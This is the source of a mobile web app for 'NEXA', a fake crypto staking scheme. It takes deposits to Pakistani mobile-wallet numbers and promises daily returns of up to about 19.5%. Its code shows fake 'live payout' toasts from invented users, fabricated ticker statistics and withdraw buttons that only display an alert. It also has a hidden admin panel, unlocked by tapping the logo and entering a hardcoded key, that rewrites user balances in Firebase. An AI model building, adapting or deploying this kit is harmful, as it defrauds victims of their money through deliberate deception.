<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Sovereign Ultimate</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        :root { --accent: #0066ff; --bg: #fdfdfe; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #0f172a; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass-panel { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(0,0,0,0.05); border-radius: 28px; }
        .card-elite { background: linear-gradient(135deg, #0066ff 0%, #0033cc 100%); color: white; border-radius: 35px; box-shadow: 0 20px 40px -10px rgba(0, 102, 255, 0.3); position: relative; overflow: hidden; }
        .ticker-wrap { background: #0f172a; color: #00f2ff; font-size: 10px; font-weight: 800; padding: 8px 0; overflow: hidden; white-space: nowrap; }
        .ticker-move { display: inline-block; animation: ticker 40s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .notif-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 10000; display: none; min-width: 280px; }
        .nexa-input { background: #f1f5f9; border-radius: 18px; padding: 16px; width: 100%; outline: none; border: 2px solid transparent; transition: 0.3s; font-weight: 600; }
        .nexa-input:focus { border-color: var(--accent); background: white; }
        .hidden { display: none; }
        ::-webkit-scrollbar { display: none; }
        .tab-active { color: var(--accent) !important; transform: translateY(-3px); }
    </style>
</head>
<body>

    <!-- 1. LIVE MARKET TICKER -->
    <div class="ticker-wrap">
        <div class="ticker-move">
            BTC/USD: <span id="btc-p">$67,432.10</span> • ETH/USD: <span id="eth-p">$3,541.20</span> • NEXA TOKEN: <span class="text-white">$1.04 (+5.2%)</span> • ACTIVE NODES: 24,901 • TOTAL HARVESTED: $4.2M • NETWORK STATUS: SECURE ●
        </div>
    </div>

    <!-- 2. SOCIAL PROOF NOTIFICATIONS (Fake Payouts) -->
    <div id="toast" class="notif-toast animate__animated">
        <div class="glass-panel px-6 py-4 shadow-2xl flex items-center gap-3 border-l-4 border-green-500">
            <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-green-600"><i class="fa-solid fa-circle-check text-xl"></i></div>
            <div>
                <p class="text-[10px] font-black uppercase text-slate-400 leading-none mb-1">Live Payout</p>
                <p class="text-[11px] font-bold text-slate-800" id="toast-msg"></p>
            </div>
        </div>
    </div>

    <!-- 3. HIDDEN GOD MODE UI -->
    <div id="god-ui" class="fixed inset-0 bg-white/95 backdrop-blur-xl z-[9999] hidden p-8 overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="font-black text-3xl italic tracking-tighter text-blue-600">MASTER CORE</h2>
            <button onclick="toggleGodMode(false)" class="w-12 h-12 bg-red-50 text-red-500 rounded-2xl flex items-center justify-center"><i class="fa-solid fa-xmark"></i></button>
        </div>
        <div class="space-y-6">
            <div class="p-6 bg-slate-50 rounded-[30px] border border-slate-100">
                <p class="text-[10px] font-black text-slate-400 uppercase mb-4 tracking-widest">Balance Adjuster</p>
                <input type="text" id="adm-uid" placeholder="User UID" class="nexa-input mb-3">
                <input type="number" id="adm-bal" placeholder="New Amount ($)" class="nexa-input mb-3">
                <button onclick="adminEditBalance()" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-black">UPDATE DATABASE</button>
            </div>
            <div class="p-6 bg-slate-50 rounded-[30px] border border-slate-100">
                <p class="text-[10px] font-black text-slate-400 uppercase mb-4 tracking-widest">Promo Generator</p>
                <input type="text" id="adm-p-code" placeholder="Code (e.g. GIFT786)" class="nexa-input mb-3">
                <input type="number" id="adm-p-amt" placeholder="Value ($)" class="nexa-input mb-3">
                <button onclick="adminAddPromo()" class="w-full bg-slate-900 text-white p-4 rounded-2xl font-black">ACTIVATE PROMO</button>
            </div>
        </div>
    </div>

    <div class="max-w-md mx-auto px-6 py-6 pb-32">
        <!-- 4. HEADER & LOGO (Trigger for God Mode) -->
        <header class="flex justify-between items-center mb-8">
            <div id="nexa-logo" class="flex items-center gap-3 cursor-pointer">
                <div class="w-12 h-12 bg-blue-600 rounded-2xl flex items-center justify-center text-white shadow-xl shadow-blue-200"><i class="fa-solid fa-bolt-lightning text-xl"></i></div>
                <div>
                    <h1 class="text-2xl font-black italic tracking-tighter leading-none">NEXA<span class="text-blue-600">.</span></h1>
                    <span class="text-[9px] font-bold text-green-500 uppercase tracking-widest">● Sovereign Node</span>
                </div>
            </div>
            <button onclick="logout()" class="w-12 h-12 glass-panel flex items-center justify-center text-red-500 border-none"><i class="fa-solid fa-power-off text-sm"></i></button>
        </header>

        <!-- 5. HOME DASHBOARD -->
        <main id="p-home" class="animate__animated animate__fadeIn">
            <div class="card-elite p-8 mb-8">
                <p class="text-[10px] font-black opacity-70 uppercase tracking-[3px]">Available Liquidity</p>
                <h2 id="user-bal" class="text-5xl font-black mt-2 tracking-tighter">$0.00</h2>
                <div class="flex gap-4 mt-10">
                    <button onclick="showPage('deposit')" class="flex-1 bg-white text-blue-600 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest shadow-xl">Deposit</button>
                    <button onclick="showPage('withdraw')" class="flex-1 bg-white/20 backdrop-blur-md py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest">Withdraw</button>
                </div>
            </div>

            <!-- PROMO & REFERRAL SECTION -->
            <div class="grid grid-cols-2 gap-3 mb-8">
                <div class="glass-panel p-4">
                    <p class="text-[8px] font-black text-slate-400 uppercase mb-2">Network ID</p>
                    <p id="ref-display" class="text-xs font-bold text-blue-600">NEXA-LDR</p>
                </div>
                <div class="glass-panel p-4 flex flex-col justify-center">
                    <button onclick="copyRef()" class="text-[10px] font-black text-slate-800 uppercase"><i class="fa-solid fa-share-nodes mr-2"></i>Copy Link</button>
                </div>
            </div>

            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400 mb-6 flex items-center gap-2">Staking Nodes <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span></h3>
            <div id="nodes-grid" class="space-y-4"></div>
        </main>

        <!-- 6. DEPOSIT PAGE (Updated Numbers) -->
        <main id="p-deposit" class="hidden animate__animated animate__fadeInUp">
            <h2 class="text-3xl font-black mb-8 italic">Add Funds</h2>
            <div id="method-selector" class="space-y-4">
                <div onclick="selectMethod('Easypaisa', '03379827882')" class="glass-panel p-6 flex justify-between items-center border-l-4 border-green-500 cursor-pointer">
                    <div><p class="text-xs font-bold">Easypaisa</p><p class="text-[10px] text-slate-400">Instant Verification</p></div>
                    <i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
                <div onclick="selectMethod('JazzCash', '03705519562')" class="glass-panel p-6 flex justify-between items-center border-l-4 border-yellow-500 cursor-pointer">
                    <div><p class="text-xs font-bold">JazzCash</p><p class="text-[10px] text-slate-400">Premium Gateway</p></div>
                    <i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
                <div onclick="selectMethod('SadaPay', '03705519562')" class="glass-panel p-6 flex justify-between items-center border-l-4 border-pink-500 cursor-pointer">
                    <div><p class="text-xs font-bold">SadaPay</p><p class="text-[10px] text-slate-400">Zero Fees</p></div>
                    <i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
            </div>

            <div id="dep-form" class="hidden space-y-4 mt-2">
                <div class="p-8 bg-blue-50 rounded-[35px] border border-blue-100 text-center">
                    <p class="text-[10px] font-black text-blue-600 mb-2 uppercase">Account Details (<span id="m-name"></span>)</p>
                    <p id="m-num" class="text-3xl font-black tracking-widest text-slate-800 mb-2"></p>
                    <p class="text-[9px] text-slate-400 font-bold uppercase">Send only USD equivalent PKR</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount in USD ($)" class="nexa-input">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="nexa-input">
                <button onclick="submitAction('Deposit')" class="w-full bg-blue-600 text-white p-5 rounded-[25px] font-black shadow-xl shadow-blue-100 uppercase text-xs tracking-widest">Submit Proof</button>
            </div>
        </main>

        <!-- 7. WITHDRAW PAGE -->
        <main id="p-withdraw" class="hidden animate__animated animate__fadeInUp">
            <h2 class="text-3xl font-black mb-8 italic">Harvest</h2>
            <div class="space-y-6">
                <div class="p-8 glass-panel border-b-8 border-blue-600">
                    <p class="text-[10px] font-black text-slate-400 uppercase mb-2">Withdrawable Capital</p>
                    <p id="wit-bal-val" class="text-5xl font-black text-blue-600 tracking-tighter">$0.00</p>
                </div>
                <input type="number" id="wit-amt" placeholder="Amount to withdraw" class="nexa-input">
                <input type="text" id="wit-acc" placeholder="Account Number" class="nexa-input">
                <select id="wit-meth" class="nexa-input bg-white font-bold">
                    <option>Easypaisa</option>
                    <option>JazzCash</option>
                    <option>SadaPay</option>
                </select>
                <button onclick="submitAction('Withdraw')" class="w-full bg-slate-900 text-white p-5 rounded-[25px] font-black uppercase text-xs tracking-widest shadow-2xl">Confirm Payout</button>
            </div>
        </main>

        <!-- 8. NAVIGATION DOCK -->
        <nav class="fixed bottom-8 left-1/2 -translate-x-1/2 w-[90%] max-w-md glass-panel p-4 flex justify-around items-center z-[1000] shadow-2xl border-none">
            <button onclick="showPage('home')" id="n-home" class="text-slate-400 tab-active transition-all"><i class="fa-solid fa-grid-2 text-xl"></i></button>
            <button onclick="showPage('deposit')" id="n-deposit" class="text-slate-400 transition-all"><i class="fa-solid fa-wallet text-xl"></i></button>
            <button onclick="showPage('withdraw')" id="n-withdraw" class="text-slate-400 transition-all"><i class="fa-solid fa-clock-rotate-left text-xl"></i></button>
        </nav>

        <!-- SUPPORT BUTTON -->
        <a href="https://wa.me/923379827882" class="fixed bottom-28 right-8 w-14 h-14 bg-green-500 text-white rounded-full flex items-center justify-center shadow-2xl animate__animated animate__bounceIn shadow-green-200"><i class="fa-brands fa-whatsapp text-2xl"></i></a>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        // Firebase Config (Using your project details)
        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);
        const uid = localStorage.getItem('nexa_uid');

        // --- CORE NAVIGATION ---
        window.showPage = (id) => {
            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
            document.getElementById('p-'+id).classList.remove('hidden');
            document.querySelectorAll('nav button').forEach(b => b.classList.remove('tab-active'));
            document.getElementById('n-'+id).classList.add('tab-active');
            window.scrollTo(0,0);
        };

        // --- GATEWAY LOGIC ---
        window.selectMethod = (name, num) => {
            document.getElementById('method-selector').classList.add('hidden');
            document.getElementById('dep-form').classList.remove('hidden');
            document.getElementById('m-name').innerText = name;
            document.getElementById('m-num').innerText = num;
        };

        window.submitAction = (type) => {
            alert(type + " request has been sent for manual node verification sweetie!");
            showPage('home');
        };

        window.copyRef = () => {
            const link = "https://nexa-sovereign.pro/?join=" + document.getElementById('ref-display').innerText;
            navigator.clipboard.writeText(link);
            alert("Invite Link Copied Sweetie!");
        };

        // --- DATA HUB ---
        async function run() {
            if(!uid) {
                const name = prompt("Enter Node Name Sweetie:");
                if(name) {
                    const res = await signInAnonymously(auth);
                    const code = 'NX' + Math.floor(100 + Math.random() * 899);
                    await set(ref(db, `users/${res.user.uid}`), { username: name, balance: 0, ref: code });
                    localStorage.setItem('nexa_uid', res.user.uid);
                    location.reload();
                }
            } else {
                // Sync Balance & Ref
                onValue(ref(db, `users/${uid}`), s => {
                    if(s.exists()){
                        const b = s.val().balance.toFixed(2);
                        document.getElementById('user-bal').innerText = `$${b}`;
                        document.getElementById('wit-bal-val').innerText = `$${b}`;
                        document.getElementById('ref-display').innerText = s.val().ref;
                    }
                });

                // Generate 20 Staking Nodes
                const grid = document.getElementById('nodes-grid');
                grid.innerHTML = "";
                for(let i=1; i<=20; i++) {
                    const isVip = i > 15;
                    grid.innerHTML += `
                    <div class="glass-panel p-6 flex justify-between items-center animate__animated animate__fadeInUp" style="animation-delay: ${i*0.05}s">
                        <div class="flex items-center gap-4">
                            <div class="w-12 h-12 ${isVip ? 'bg-amber-100 text-amber-600' : 'bg-blue-50 text-blue-600'} rounded-2xl flex items-center justify-center text-xs font-black">${isVip ? 'VIP' : i}</div>
                            <div>
                                <h4 class="text-[10px] font-black text-slate-400 uppercase tracking-tighter">${isVip ? 'Elite Node' : 'Node Gen-'+i}</h4>
                                <p class="text-base font-bold text-slate-800">${(1.5 + i*0.9).toFixed(1)}% Daily</p>
                            </div>
                        </div>
                        <button onclick="alert('Staking logic activated sweetie!')" class="${isVip ? 'bg-amber-500' : 'bg-blue-600'} text-white px-5 py-3 rounded-2xl text-[9px] font-black uppercase tracking-widest shadow-lg">Stake $${i*12}</button>
                    </div>`;
                }
            }
        }

        // --- FAKE SOCIAL PROOF SYSTEM ---
        const fakeUsers = ["Arsalan", "Zoya", "M. Hashir", "Sadaf", "Usman", "Esha", "Kashif"];
        setInterval(() => {
            const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
            const amt = Math.floor(Math.random() * 450) + 50;
            const msg = `User ${user}*** successfully harvested$${amt}!`;
            const toast = document.getElementById('toast');
            document.getElementById('toast-msg').innerText = msg;
            toast.style.display = 'block';
            toast.classList.add('animate__fadeInDown');
            setTimeout(() => {
                toast.classList.replace('animate__fadeInDown', 'animate__fadeOutUp');
                setTimeout(() => { toast.style.display = 'none'; toast.classList.remove('animate__fadeOutUp'); }, 500);
            }, 4000);
        }, 18000);

        // --- GOD MODE CORE ---
        let taps = 0;
        document.getElementById('nexa-logo').onclick = () => {
            taps++;
            if(taps === 4) {
                if(prompt("MASTER KEY:") === "NEXA786") toggleGodMode(true);
                taps = 0;
            }
            setTimeout(() => taps = 0, 2000);
        };
        window.toggleGodMode = (s) => document.getElementById('god-ui').style.display = s ? 'block' : 'none';
        window.adminEditBalance = async () => {
            const id = document.getElementById('adm-uid').value;
            const b = document.getElementById('adm-bal').value;
            await update(ref(db, `users/${id}`), { balance: parseFloat(b) });
            alert("Database Synced!");
        };
        window.adminAddPromo = async () => {
            const c = document.getElementById('adm-p-code').value.toUpperCase();
            const v = document.getElementById('adm-p-amt').value;
            await set(ref(db, `promos/${c}`), { bonus: parseFloat(v) });
            alert("Promo " + c + " is Live!");
        };

        window.logout = () => { localStorage.clear(); location.reload(); };
        run();
    </script>
</body>
</html>
